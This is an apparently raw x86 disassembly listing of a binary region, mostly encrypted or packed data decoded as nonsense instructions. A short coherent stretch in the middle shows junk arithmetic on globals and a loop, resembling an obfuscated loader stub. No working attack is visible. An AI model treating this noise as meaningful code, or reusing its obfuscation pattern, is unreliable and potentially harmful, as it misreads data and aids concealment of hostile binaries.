  40d9a9:	jge    0x40d96e
  40d9ab:	outs   dx,DWORD PTR ds:[esi]
  40d9ac:	iret   
  40d9ad:	leave  
  40d9ae:	in     eax,0x19
  40d9b0:	mov    ah,0x70
  40d9b2:	cdq    
  40d9b3:	xor    al,0xa6
  40d9b5:	into   
  40d9b6:	outs   dx,BYTE PTR ds:[esi]
  40d9b7:	jle    0x40d97c
  40d9b9:	inc    edi
  40d9ba:	add    ebx,eax
  40d9bc:	push   0xffffffcc
  40d9be:	dec    ebx
  40d9bf:	cmp    DWORD PTR [ecx],esi
  40d9c1:	loop   0x40da19
  40d9c3:	arpl   sp,di
  40d9c5:	pop    eax
  40d9c6:	dec    eax
  40d9c7:	fwait
  40d9c8:	rol    BYTE PTR [ecx],1
  40d9ca:	test   DWORD PTR [edx+ecx*4-0x2f],ecx
  40d9ce:	aam    0xd8
  40d9d0:	lods   al,BYTE PTR ds:[esi]
  40d9d1:	sahf   
  40d9d2:	inc    edx
  40d9d3:	mov    ds:0xca5980ac,al
  40d9d8:	pop    edx
  40d9d9:	test   al,0xec
  40d9db:	pop    esi
  40d9dc:	jl     0x40da1e
  40d9de:	sti    
  40d9df:	or     ecx,DWORD PTR [edx-0x5]
  40d9e2:	arpl   WORD PTR [ebp+0x17],si
  40d9e5:	inc    edx
  40d9e6:	sub    BYTE PTR [esi],ch
  40d9e8:	jmp    0x40da14
  40d9ea:	mov    BYTE PTR [ebx-0x61],bl
  40d9ed:	les    ecx,FWORD PTR [ebx]
  40d9ef:	add    DWORD PTR [eax],0x74
  40d9f2:	aad    0x29
  40d9f4:	mov    dh,0x98
  40d9f6:	(bad)  
  40d9f7:	mul    BYTE PTR [eax+0x5d]
  40d9fa:	leave  
  40d9fb:	dec    edi
  40d9fc:	imul   ebp,DWORD PTR [esi+0x4c],0x61
  40da00:	les    eax,FWORD PTR [edx+0x17]
  40da03:	les    ebx,FWORD PTR [esi+0x3cc363fc]
  40da09:	jb     0x40da3f
  40da0b:	js     0x40d9dd
  40da0d:	call   0x8c50b090
  40da12:	jne    0x40d9dd
  40da14:	shl    dh,1
  40da16:	punpcklbw mm1,mm7
  40da19:	repz pushf 
  40da1b:	gs sub esp,esp
  40da1e:	pushf  
  40da1f:	and    ebp,ebx
  40da21:	in     eax,0xbe
  40da23:	and    BYTE PTR [ebx],cl
  40da25:	xchg   DWORD PTR [ebx-0x43708580],edi
  40da2b:	or     eax,0xecc221f3
  40da30:	pushf  
  40da31:	rol    DWORD PTR [edx+0x2945aa5e],0x76
  40da38:	jbe    0x40da6e
  40da3a:	sbb    DWORD PTR [ebx],ebp
  40da3c:	push   ss
  40da3d:	shl    ah,cl
  40da3f:	pop    ds
  40da40:	neg    BYTE PTR [edx]
  40da42:	adc    DWORD PTR [esi],0xd595cc22
  40da48:	mov    esp,0x3055d8ad
  40da4d:	push   0x4af82c19
  40da52:	sbb    esi,DWORD PTR [ecx]
  40da54:	pop    edi
  40da55:	adc    bh,BYTE PTR [esi-0x2ec979ff]
  40da5b:	xchg   edx,eax
  40da5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da5d:	mov    bh,0x7c
  40da5f:	aas    
  40da60:	pushf  
  40da61:	xor    BYTE PTR [ebp-0x64],0xf2
  40da65:	sbb    al,0x61
  40da67:	mov    BYTE PTR [esi+0x1c],ah
  40da6a:	sbb    al,0x65
  40da6c:	das    
  40da6d:	xor    ebp,esi
  40da6f:	imul   ebp,DWORD PTR [edx-0x6],0x51
  40da73:	repnz sub bh,BYTE PTR [edi-0x43]
  40da77:	mov    cl,0x87
  40da79:	mov    cl,0x6d
  40da7b:	test   eax,0xbf69eb8e
  40da80:	jmp    0x284e69de
  40da85:	(bad)  
  40da86:	fdivr  DWORD PTR [eax]
  40da88:	je     0x40dae2
  40da8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da8b:	call   0x55a8e9ce
  40da90:	add    DWORD PTR [eax+0x5cf79296],ebp
  40da96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da97:	nop
  40da98:	pop    ebx
  40da99:	or     ecx,DWORD PTR [edx-0x2]
  40da9c:	out    dx,al
  40da9d:	xchg   esi,eax
  40da9e:	sub    BYTE PTR [ebx+0x5196f74a],ah
  40daa4:	xchg   ebx,eax
  40daa5:	icebp  
  40daa6:	sub    BYTE PTR [ebx],0x84
  40daa9:	(bad)  
  40daaa:	sahf   
  40daab:	aaa    
  40daac:	push   eax
  40daad:	fs loop 0x40daf7
  40dab0:	jp     0x40dab6
  40dab2:	(bad)  
  40dab3:	sbb    DWORD PTR [eax],esi
  40dab5:	cs in  al,0xc9
  40dab8:	stos   DWORD PTR es:[edi],eax
  40dab9:	inc    ebx
  40daba:	jnp    0x40dafe
  40dabc:	xchg   ecx,eax
  40dabd:	popa   
  40dabe:	ror    BYTE PTR [esi],cl
  40dac0:	jb     0x40dabf
  40dac2:	pop    ecx
  40dac3:	sbb    eax,0x8133e44c
  40dac8:	std    
  40dac9:	scas   al,BYTE PTR es:[edi]
  40daca:	push   0xf8202a0d
  40dacf:	mov    ah,0xd4
  40dad1:	cwde   
  40dad2:	inc    esi
  40dad3:	xor    al,0x74
  40dad5:	add    BYTE PTR [ecx],bl
  40dad7:	and    DWORD PTR [ebx-0x34],ecx
  40dada:	push   eax
  40dadb:	dec    esi
  40dadc:	push   ebp
  40dadd:	pushf  
  40dade:	into   
  40dadf:	dec    ebx
  40dae0:	ds stos BYTE PTR es:[edi],al
  40dae2:	pushf  
  40dae3:	and    esp,0x54
  40dae6:	sub    BYTE PTR [eax+ebp*4],cl
  40dae9:	inc    ebp
  40daea:	repnz in al,dx
  40daec:	mov    DWORD PTR [ecx+ecx*4],esp
  40daef:	out    dx,al
  40daf0:	test   edi,ebp
  40daf2:	push   ss
  40daf3:	adc    al,0xe0
  40daf5:	mov    ecx,ebp
  40daf7:	or     al,0xfe
  40daf9:	xor    DWORD PTR [edx-0x68a57456],esi
  40daff:	in     al,0xad
  40db01:	mov    bh,0x29
  40db03:	cwde   
  40db04:	ss scas al,BYTE PTR es:[edi]
  40db06:	cwde   
  40db07:	call   0x7437:0x4204
  40db0d:	je     0x40daca
  40db0f:	in     al,dx
  40db10:	xchg   esi,eax
  40db11:	outs   dx,DWORD PTR ds:[esi]
  40db12:	stc    
  40db13:	jbe    0x40db43
  40db15:	in     al,0x4a
  40db17:	outs   dx,DWORD PTR ds:[esi]
  40db18:	test   eax,0x77f375d4
  40db1d:	iret   
  40db1e:	and    DWORD PTR [edi+0x36],ebx
  40db21:	dec    esi
  40db22:	dec    ebx
  40db23:	mov    ch,ch
  40db25:	fidivr WORD PTR [eax+0x572fbe88]
  40db2b:	xchg   BYTE PTR [edi+0x216b2574],al
  40db31:	mov    bl,0x75
  40db33:	pop    ebx
  40db34:	lods   eax,DWORD PTR ds:[esi]
  40db35:	pop    ss
  40db36:	int3   
  40db37:	push   eax
  40db38:	sbb    dl,BYTE PTR [esi]
  40db3a:	mov    dl,0x6d
  40db3c:	jp     0x40dacb
  40db3e:	jp     0x40dbb6
  40db40:	shl    BYTE PTR [ecx],cl
  40db42:	arpl   WORD PTR [ebp-0x108cbfaa],dx
  40db48:	ret    0xf0c1
  40db4b:	cmc    
  40db4c:	fbld   TBYTE PTR [ebx-0x2822ebf]
  40db52:	or     edx,ebx
  40db54:	jl     0x40dba4
  40db56:	sub    eax,0x82ea78fe
  40db5b:	cmc    
  40db5c:	pop    esi
  40db5d:	jne    0x40dbbf
  40db5f:	fwait
  40db60:	imul   edi,DWORD PTR ds:0xeb86f46d,0x4ec6bf50
  40db6a:	cmp    BYTE PTR [esp+eiz*2+0x2d],0xb6
  40db6f:	adc    dh,BYTE PTR [ebp+eax*1-0x29]
  40db73:	fidiv  DWORD PTR ds:0x34b13400
  40db79:	sub    eax,DWORD PTR [ecx]
  40db7b:	sub    esi,DWORD PTR [ebx-0x39]
  40db7e:	adc    al,BYTE PTR [edi+0x13]
  40db81:	imul   eax,ebx,0x6d30b53f
  40db87:	mov    ebx,esp
  40db89:	aad    0xfe
  40db8b:	or     bh,cl
  40db8d:	push   edi
  40db8e:	xor    BYTE PTR [esi-0x7e],0xef
  40db92:	mov    bh,BYTE PTR [eax+0x6a]
  40db95:	mov    ds:0x9aa6fbe8,al
  40db9a:	cli    
  40db9b:	shl    dh,1
  40db9d:	test   esp,ebx
  40db9f:	out    0xfa,al
  40dba1:	std    
  40dba2:	xor    DWORD PTR [eax+0x28360ae8],0x74
  40dba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbaa:	dec    esp
  40dbab:	je     0x40db38
  40dbad:	fdiv   DWORD PTR ds:0xc243485f
  40dbb3:	out    0x12,al
  40dbb5:	fidivr DWORD PTR [edi+0x72433b2a]
  40dbbb:	push   edi
  40dbbc:	push   esp
  40dbbd:	dec    ebp
  40dbbe:	out    0xb0,al
  40dbc0:	fwait
  40dbc1:	ss pop ecx
  40dbc3:	dec    ebp
  40dbc4:	mov    DWORD PTR [eax-0xd3e1e1a],esi
  40dbca:	fyl2xp1 
  40dbcc:	pushf  
  40dbcd:	div    DWORD PTR [edx-0x3c]
  40dbd0:	rcr    cl,cl
  40dbd2:	cmp    al,0xb7
  40dbd4:	push   cs
  40dbd5:	repnz xchg edx,eax
  40dbd7:	mov    al,ds:0xd7c4db20
  40dbdc:	mov    ah,0x23
  40dbde:	(bad)
  40dbe2:	out    0x12,eax
  40dbe4:	popf   
  40dbe5:	(bad)  
  40dbe6:	stos   DWORD PTR es:[edi],eax
  40dbe7:	sub    eax,0x368d568
  40dbec:	test   DWORD PTR [edi+ebx*4-0x4807b08b],edi
  40dbf3:	cmp    DWORD PTR [ecx-0x10c0ada8],esi
  40dbf9:	add    DWORD PTR [esi+esi*8+0x438950e5],ebx
  40dc00:	mov    ds:0x38fa3549,eax
  40dc05:	lea    edi,[esi]
  40dc07:	stos   BYTE PTR es:[edi],al
  40dc08:	call   0xd624:0x8803959f
  40dc0f:	aaa    
  40dc10:	or     DWORD PTR [bx+si+0x7fd7],edx
  40dc15:	sbb    ch,ah
  40dc17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc18:	pop    ecx
  40dc19:	xchg   edi,eax
  40dc1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc1b:	lods   eax,DWORD PTR ds:[esi]
  40dc1c:	push   edi
  40dc1d:	sbb    DWORD PTR [edx-0x2f14132d],eax
  40dc23:	adc    al,BYTE PTR ds:0xb92d0d94
  40dc29:	push   ss
  40dc2a:	inc    edx
  40dc2b:	adc    ah,BYTE PTR [edx-0x37d6b3ec]
  40dc31:	fnstcw WORD PTR [edx]
  40dc33:	mov    cl,0x32
  40dc35:	fcom   QWORD PTR [ebp-0x56]
  40dc38:	cmp    edx,DWORD PTR [esi+0x77dc41bb]
  40dc3e:	inc    ecx
  40dc3f:	push   edx
  40dc40:	or     ecx,edx
  40dc42:	data16 mov ch,0x51
  40dc45:	push   ss
  40dc46:	das    
  40dc47:	sbb    al,0xae
  40dc49:	pop    esp
  40dc4a:	sbb    dl,0x7c
  40dc4d:	pop    ss
  40dc4e:	(bad)  
  40dc4f:	mov    ch,0xdd
  40dc51:	pop    ds
  40dc52:	and    DWORD PTR [ecx-0x69951e8],edi
  40dc58:	pop    ebp
  40dc59:	setns  al
  40dc5c:	adc    al,0x19
  40dc5e:	jp     0x40dc7c
  40dc60:	pop    esp
  40dc61:	js     0x40dcc3
  40dc63:	mov    DWORD PTR [edi-0x2d],edx
  40dc66:	lock iret 
  40dc68:	ds jmp 0x4aa8:0xe9bcb956
  40dc70:	push   eax
  40dc71:	inc    ebx
  40dc72:	lods   al,BYTE PTR ds:[esi]
  40dc73:	mov    edx,0x4de11221
  40dc78:	lock sbb edi,DWORD PTR [edx]
  40dc7b:	mov    ch,0xc
  40dc7d:	xor    al,0x30
  40dc7f:	retf   
  40dc80:	out    0x8f,al
  40dc82:	inc    eax
  40dc83:	pop    esi
  40dc84:	scas   al,BYTE PTR es:[edi]
  40dc85:	jg     0x40dc2c
  40dc87:	lds    esi,FWORD PTR [esi-0x73c8801d]
  40dc8d:	jl     0x40dc9e
  40dc8f:	mov    eax,0xb38ff893
  40dc94:	dec    ecx
  40dc95:	mov    eax,ds:0x989e6bca
  40dc9a:	mov    bh,0x74
  40dc9c:	out    dx,eax
  40dc9d:	aas    
  40dc9e:	adc    al,0x3c
  40dca0:	lahf   
  40dca1:	jne    0x40dcbc
  40dca3:	xor    edx,DWORD PTR [esp+ecx*2-0x13b2a290]
  40dcaa:	jp     0x40dd10
  40dcac:	loope  0x40dd04
  40dcae:	push   edx
  40dcaf:	std    
  40dcb0:	jg     0x40dc39
  40dcb2:	adc    al,0x52
  40dcb4:	inc    ecx
  40dcb5:	push   cs
  40dcb6:	out    0x31,al
  40dcb8:	aad    0xd
  40dcba:	jecxz  0x40dc62
  40dcbc:	jne    0x40dc4e
  40dcbe:	shr    DWORD PTR [eax],0x17
  40dcc1:	jmp    0x40dc8f
  40dcc3:	xor    DWORD PTR [ecx],0xffffffa9
  40dcc6:	(bad)  
  40dcc7:	retf   
  40dcc8:	lock xchg esp,eax
  40dcca:	jmp    0x40dcfc
  40dccc:	scas   eax,DWORD PTR es:[edi]
  40dccd:	xor    ebp,DWORD PTR [esi-0x7d]
  40dcd0:	sub    ax,0x2c97
  40dcd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd5:	pop    edi
  40dcd6:	xlat   BYTE PTR ds:[ebx]
  40dcd7:	je     0x40dd52
  40dcd9:	sbb    ah,bh
  40dcdb:	dec    ebx
  40dcdc:	push   ecx
  40dcdd:	int    0x46
  40dcdf:	mov    DWORD PTR [edx-0x6c],esp
  40dce2:	retf   0x980f
  40dce5:	mov    bh,0x8e
  40dce7:	xor    DWORD PTR [esi],esi
  40dce9:	enter  0x4a20,0x93
  40dced:	stos   DWORD PTR es:[edi],eax
  40dcee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcef:	mov    DWORD PTR [ecx+edi*2+0x78],ebp
  40dcf3:	adc    al,0xe8
  40dcf5:	(bad)
  40dcf9:	xor    BYTE PTR [edi],al
  40dcfb:	and    BYTE PTR [esi+esi*2],bl
  40dcfe:	cmp    al,0xe7
  40dd00:	pop    eax
  40dd01:	mov    al,ds:0xc9bc563a
  40dd06:	jle    0x40dce8
  40dd08:	xchg   esi,esp
  40dd0a:	outs   dx,BYTE PTR ds:[esi]
  40dd0b:	xchg   esp,ecx
  40dd0d:	inc    edx
  40dd0e:	or     eax,0xb736ca4a
  40dd13:	jl     0x40dd3c
  40dd15:	jbe    0x40dd54
  40dd17:	ret    0xb935
  40dd1a:	or     BYTE PTR [ecx],bl
  40dd1c:	or     esi,DWORD PTR [edi-0x64e644f5]
  40dd22:	xchg   esp,eax
  40dd23:	lds    ebx,FWORD PTR [edx+0x5f9397ae]
  40dd29:	mov    bl,0xe5
  40dd2b:	inc    esp
  40dd2c:	cmc    
  40dd2d:	mov    eax,DWORD PTR [ecx+eax*2-0x19cfdfcb]
  40dd34:	mov    ebx,0xb885f958
  40dd39:	cwde   
  40dd3a:	std    
  40dd3b:	add    BYTE PTR [ebx+0x2ad2f242],cl
  40dd41:	xor    dh,BYTE PTR [edx-0x62]
  40dd44:	xor    DWORD PTR [edi-0x60],esi
  40dd47:	add    BYTE PTR [ebp-0x7f],al
  40dd4a:	dec    edi
  40dd4b:	sub    BYTE PTR [edx+0x6a464655],0x64
  40dd52:	inc    edi
  40dd53:	push   0x6c
  40dd55:	push   cs
  40dd56:	mov    ds:0x3ebc28f5,eax
  40dd5b:	popa   
  40dd5c:	int    0x97
  40dd5e:	push   esp
  40dd5f:	adc    BYTE PTR [ebx],ch
  40dd61:	push   eax
  40dd62:	push   ebp
  40dd63:	push   eax
  40dd64:	loope  0x40dd4b
  40dd66:	sub    edi,edi
  40dd68:	xchg   edi,eax
  40dd69:	xchg   ecx,eax
  40dd6a:	xchg   esi,eax
  40dd6b:	and    esp,DWORD PTR [ebx+0x1a90ac47]
  40dd71:	inc    eax
  40dd72:	aam    0x6d
  40dd74:	shr    cl,0xb9
  40dd77:	jge    0x40dd22
  40dd79:	mov    al,0xa2
  40dd7b:	xor    DWORD PTR [eax+0xc272576],0x7c
  40dd82:	sbb    al,0x7a
  40dd84:	push   esi
  40dd85:	mov    eax,ds:0x2dc37241
  40dd8a:	mov    edx,0x2b3f0c19
  40dd8f:	fwait
  40dd90:	sbb    al,0x4c
  40dd92:	int3   
  40dd93:	mov    edi,0xeb36bc6
  40dd98:	push   eax
  40dd99:	push   edi
  40dd9a:	jl     0x40ddb0
  40dd9c:	add    edx,DWORD PTR [ebx-0x58]
  40dd9f:	jno    0x40dd92
  40dda1:	aaa    
  40dda2:	xchg   ebx,eax
  40dda3:	frstor [ebx-0x65dcb050]
  40dda9:	jp     0x40dd6c
  40ddab:	pop    es
  40ddac:	inc    ebx
  40ddad:	xchg   BYTE PTR [edi-0x5a],ch
  40ddb0:	jnp    0x40de30
  40ddb2:	and    cl,dl
  40ddb4:	pop    ebx
  40ddb6:	stc    
  40ddb7:	mov    eax,ds:0xd62fa6f9
  40ddbc:	pop    ecx
  40ddbd:	mov    al,0xdb
  40ddbf:	add    DWORD PTR [ecx+eiz*2],0x838d8931
  40ddc6:	mov    ds:0xeec65958,eax
  40ddcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddcc:	and    DWORD PTR [edx-0x18cbff4c],edi
  40ddd2:	and    BYTE PTR [esi+eax*8],0x8a
  40ddd6:	pushf  
  40ddd7:	not    DWORD PTR [ecx-0x67935511]
  40dddd:	xor    DWORD PTR [esi+esi*2],edx
  40dde0:	test   DWORD PTR [edi-0x14280b8d],0x9e202cc1
  40ddea:	gs push edx
  40ddec:	xor    DWORD PTR [edx],edi
  40ddee:	sbb    eax,edi
  40ddf0:	xchg   BYTE PTR [ebp+0x48f259e5],dl
  40ddf6:	cdq    
  40ddf7:	aas    
  40ddf8:	dec    eax
  40ddf9:	push   ebp
  40ddfa:	cwde   
  40ddfb:	imul   eax,DWORD PTR [edi-0xd],0x6bda8bbb
  40de02:	jae    0x40ddeb
  40de04:	mov    BYTE PTR [edx+0x25],dh
  40de07:	into   
  40de08:	inc    ebp
  40de09:	push   ss
  40de0a:	rcr    BYTE PTR [ebx],0x3b
  40de0d:	mov    esi,0x2fe984e5
  40de12:	into   
  40de13:	stc    
  40de14:	pop    esi
  40de15:	inc    edi
  40de16:	and    eax,DWORD PTR [eax]
  40de18:	sar    ch,cl
  40de1a:	sahf   
  40de1b:	dec    eax
  40de1d:	sub    ecx,DWORD PTR [edi]
  40de1f:	fucomip st,st(1)
  40de21:	xchg   ebx,eax
  40de22:	and    cl,BYTE PTR [eax]
  40de24:	dec    edx
  40de25:	pop    edx
  40de26:	imul   esp,DWORD PTR [eax+0xc],0x6a
  40de2a:	mov    ebp,DWORD PTR [ecx-0x2b]
  40de2d:	add    ecx,DWORD PTR [esp+edi*1+0x66]
  40de31:	pushf  
  40de32:	mov    ch,0xb8
  40de34:	and    dl,BYTE PTR [esi-0x10]
  40de37:	and    eax,0xd81f68e9
  40de3c:	or     bh,BYTE PTR [edx]
  40de3e:	std    
  40de3f:	rcl    BYTE PTR [edx-0x6a],0x5e
  40de43:	(bad)  
  40de45:	enter  0x694d,0x96
  40de49:	ins    DWORD PTR es:[edi],dx
  40de4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de4b:	sub    DWORD PTR [ebp-0x5b],ebx
  40de4e:	ror    ebx,cl
  40de50:	mov    eax,DWORD PTR [ebp-0x4]
  40de53:	push   ebx
  40de54:	mov    DWORD PTR ds:0x42500c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0x24
  40dfd4:	mov    al,0x6c
  40dfd6:	retf   
  40dfd7:	(bad)
  40dfda:	(bad)  
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx-0x35]
  40dfe0:	into   
  40dfe1:	adc    eax,0x2e6d7837
  40dfe6:	push   0x28738101
  40dfeb:	test   al,0xb6
  40dfed:	jb     0x40e003
  40dfef:	test   DWORD PTR [edi+0x283995a8],edx
  40dff5:	fistp  WORD PTR [ebx+0x69]
  40dff8:	mov    esi,0xd7af429a
  40dffd:	inc    ebx
  40dffe:	sbb    eax,0x53c039ed
  40e003:	xchg   ebx,eax
  40e004:	jecxz  0x40dfe3
  40e006:	popa   
  40e007:	jl     0x40e039
  40e009:	inc    ecx
  40e00a:	sbb    eax,0x7b844332
  40e00f:	test   al,0x6a
  40e011:	cmp    DWORD PTR [edx],eax
  40e013:	faddp  st(6),st
  40e015:	push   0x8970a39
  40e01a:	jmp    0x40dfbe
  40e01c:	out    dx,eax
  40e01d:	pop    eax
  40e01e:	sbb    ah,dh
  40e020:	dec    ebx
  40e021:	xor    BYTE PTR [ebx+0x6],al
  40e024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e025:	lock (bad) 
  40e027:	cmp    ebp,edx
  40e029:	fist   WORD PTR [ebx]
  40e02b:	mov    ch,0x36
  40e02d:	jbe    0x40e044
  40e02f:	test   BYTE PTR [ebp+0x58],bh
  40e032:	and    DWORD PTR [esi],ecx
  40e034:	(bad)  [esi+esi*1-0x79]
  40e038:	ret    0xd96c
  40e03b:	jl     0x40dff8
  40e03d:	sti    
  40e03e:	fisttp WORD PTR [ebx]
  40e040:	sub    al,0x18
  40e042:	nop
  40e043:	push   edx
  40e044:	jbe    0x40e0ad
  40e046:	and    dh,BYTE PTR [ebp-0x26]
  40e049:	and    eax,0x453084e8
  40e04e:	loope  0x40e0a0
  40e050:	repnz mov bl,cl
  40e053:	in     al,0x97
  40e055:	xchg   ecx,eax
  40e056:	inc    BYTE PTR [ecx]
  40e058:	test   al,0xae
  40e05a:	mov    al,ds:0x848ba53c
  40e05f:	adc    al,0xd3
  40e061:	leave  
  40e062:	mov    ebx,0xe0169d5b
  40e067:	ret    0x6f9c
  40e06a:	sbb    ebx,esi
  40e06c:	stos   BYTE PTR es:[edi],al
  40e06d:	add    eax,0x1ede9c09
  40e072:	rol    DWORD PTR [ecx*4+0x4c988bab],1
  40e079:	sti    
  40e07a:	inc    esp
  40e07b:	outs   dx,DWORD PTR ds:[esi]
  40e07c:	leave  
  40e07d:	data16 mov WORD PTR [eax+0x4893f790],ss
  40e084:	mov    bh,0xba
  40e086:	xchg   esi,eax
  40e087:	ins    BYTE PTR es:[edi],dx
  40e088:	jno    0x40e057
  40e08a:	into   
  40e08b:	enter  0x3e5a,0xec
  40e08f:	push   edi
  40e090:	inc    edi
  40e091:	mov    ebx,0x6f1f8de
  40e096:	popa   
  40e097:	lock je 0x40e03d
  40e09a:	stos   BYTE PTR es:[edi],al
  40e09b:	jbe    0x40e02c
  40e09d:	and    esp,DWORD PTR [ecx+eiz*8-0x59]
  40e0a1:	and    dh,cl
  40e0a3:	(bad)  
  40e0a4:	mov    DWORD PTR [esi+edi*4+0x2b4649e8],esi
  40e0ab:	dec    ebx
  40e0ac:	data16 fdivr QWORD PTR [ebp+0x65]
  40e0b0:	rcr    edi,1
  40e0b2:	popa   
  40e0b3:	retf   
  40e0b4:	mov    bl,0x25
  40e0b6:	(bad)  
  40e0b7:	sbb    DWORD PTR [ebx-0x7c],edx
  40e0ba:	mov    ?,WORD PTR [ebx-0x3a69a4]
  40e0c0:	shl    BYTE PTR [eax],0x2a
  40e0c3:	mov    ds:0xcf21ff0,eax
  40e0c8:	xchg   esi,eax
  40e0c9:	stos   DWORD PTR es:[edi],eax
  40e0ca:	rcr    DWORD PTR [esi-0x3a],1
  40e0cd:	ret    
  40e0ce:	unpcklps xmm2,XMMWORD PTR [ebp+0x2c]
  40e0d2:	mov    dh,0x3d
  40e0d4:	xchg   esi,eax
  40e0d5:	mov    cl,0x5e
  40e0d7:	ins    BYTE PTR es:[edi],dx
  40e0d8:	mov    cl,0x1d
  40e0da:	call   0x1d0d998e
  40e0df:	push   es
  40e0e0:	sbb    BYTE PTR [ecx-0x5c],dl
  40e0e3:	fld    QWORD PTR ds:0xc48d85
  40e0e9:	sbb    al,0x16
  40e0eb:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40e0ed:	(bad)  
  40e0ee:	in     eax,0x91
  40e0f0:	mov    al,0xf
  40e0f2:	sbb    al,0x1d
  40e0f4:	push   cs
  40e0f5:	add    BYTE PTR [ebx-0x609ca5e7],0x61
  40e0fc:	sahf   
  40e0fd:	shl    BYTE PTR [edi+0x1f973],0x46
  40e104:	iret   
  40e105:	ret    
  40e106:	jnp    0x40e15b
  40e108:	repz scas eax,DWORD PTR es:[edi]
  40e10a:	pop    ds
  40e10b:	add    eax,0xe576ca2e
  40e110:	pop    edx
  40e111:	xchg   esp,eax
  40e112:	pop    esi
  40e113:	lods   eax,DWORD PTR ds:[esi]
  40e114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e115:	pushf  
  40e116:	loopne 0x40e17f
  40e118:	mov    eax,ds:0xf9b0e707
  40e11d:	loop   0x40e127
  40e11f:	mov    ecx,0x5c419de
  40e124:	adc    BYTE PTR [edx+0x30],ch
  40e127:	leave  
  40e128:	cmp    dh,ah
  40e12a:	mov    ds:0xdca55df0,al
  40e12f:	push   esp
  40e130:	(bad)  
  40e131:	daa    
